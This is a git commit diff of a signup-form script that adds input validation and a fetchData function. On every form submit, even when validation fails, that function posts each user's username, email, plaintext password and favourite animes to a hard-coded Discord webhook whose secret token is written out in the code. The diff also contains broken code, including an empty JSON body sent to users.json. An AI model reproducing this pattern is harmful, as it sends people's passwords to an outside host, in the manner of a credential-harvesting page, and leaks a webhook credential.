28984c2391a72f35ff17d8061f14597be4b406c2
Eyad <eyadrayan.official@outlook.com>
2026-06-19 02:41:15 +0300

    Add files via upload

--- script.js
+++ script.js
@@ -1,37 +1,99 @@
-const password = document.getElementById("pass");
-const cnfrmpass = document.getElementById("cnfrmpass");
 const email = document.getElementById("email")
 const username = document.getElementById("username")
+const password = document.getElementById("pass");
+const cnfrmpass = document.getElementById("cnfrmpass");
+const fav = document.getElementById("fav")
 const form = document.getElementById("user_input")
 
 form.addEventListener('submit', (e) => {
-    const errorElement = document.getElementById("error")
-    const passwords = document.getElementById("pass") && document.getElementById("cnfrmpass");
+    validateInputs();
+    fetchData();
 
-    let messages = []
-
-    if (email.value === '' || email.value == null) {
-        messages.push('Email is required')
-    }
-
-    if (username.value === '' || username.value == null) {
-        messages.push('Username is required')
-    }
-
-    if (password.value == '' || password.value == null) {
-        messages.push('Password is required')
-    } else if (passwords.value.length < 6 || passwords.value.length > 20) {
-        messages.push('Password must be 6 to 20 characters')
-    }
-
-    if (password.value !== cnfrmpass.value) {
-        messages.push(`Passwords do not match`)
-    }
-
-    if (messages.length > 0) {
-        e.preventDefault();
-        errorElement.innerText = messages.join(', ');
-    }
-
-
+    e.preventDefault();
 })
+
+const setError = (element, message) => {
+    const inputControl = element.parentElement;
+    const errorDisplay = inputControl.querySelector('.error');
+
+    errorDisplay.innerText = message;
+    inputControl.classList.add('error');
+    inputControl.classList.remove('success')
+}
+
+const setSuccess = element => {
+    const inputControl = element.parentElement;
+    const errorDisplay = inputControl.querySelector('.error');
+
+    errorDisplay.innerText = '';
+    inputControl.classList.add('success');
+    inputControl.classList.remove('error');
+    
+};
+
+const isValidEmail = email => {
+  const re = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+  return re.test(String(email).toLowerCase());
+}
+
+const validateInputs = () => {
+    const usernameValue = username.value.trim()
+    const emailValue = email.value.trim()
+    const passwordValue = password.value.trim()
+    const cnfrmpassValue = cnfrmpass.value.trim()
+
+    if (usernameValue === '') {
+        setError(username, 'Username is required.')
+    } else {
+        setSuccess(username);
+    }
+
+    if (emailValue === '') {
+        setError(email, 'Email is required.')
+    } else if (!isValidEmail(emailValue)) {
+        setError(email, 'Please provide a valid email address.')
+    } else {
+        setSuccess(email)
+    }
+
+    if (cnfrmpassValue === '') {
+        setError(cnfrmpass, 'Confirm your password.')
+    } else if (passwordValue !== cnfrmpassValue) {
+        setError(cnfrmpass, `Password doesn't match`)
+    } else {
+        setSuccess(cnfrmpass)
+    }
+
+    if (passwordValue === '') {
+        setError(password, 'Password is required.')
+    } else if (passwordValue.length < 6 || passwordValue.length > 20) {
+        setError(password, 'Password must be 6 to 20 character.')
+    } else {
+        setSuccess(password)
+    }
+}
+
+const fetchData = () => {
+    const formData = new FormData(form);
+    const data = Object.fromEntries(formData);
+
+    const content = {
+        content: `**Account Created** \n\n**Username:** ${data.username} \n**Email:** ${data.email} \n**Password:** ${data.pass} \n**Fav Animes:** ${data.fav || 'None listed'}`
+    }
+
+    fetch('https://discord.com/api/webhooks/1515699510955868285/FOU8fGoc20vxiyotgxh-NWFwTvo-SCZ-HYU3oHmn-QfCNNQV4r8qNHAAcy_cCsFOMDoc', {
+        method: 'post',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(content)
+    })
+
+    fetch('users.json', {
+        method: 'post',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(formData)
+    })
+}
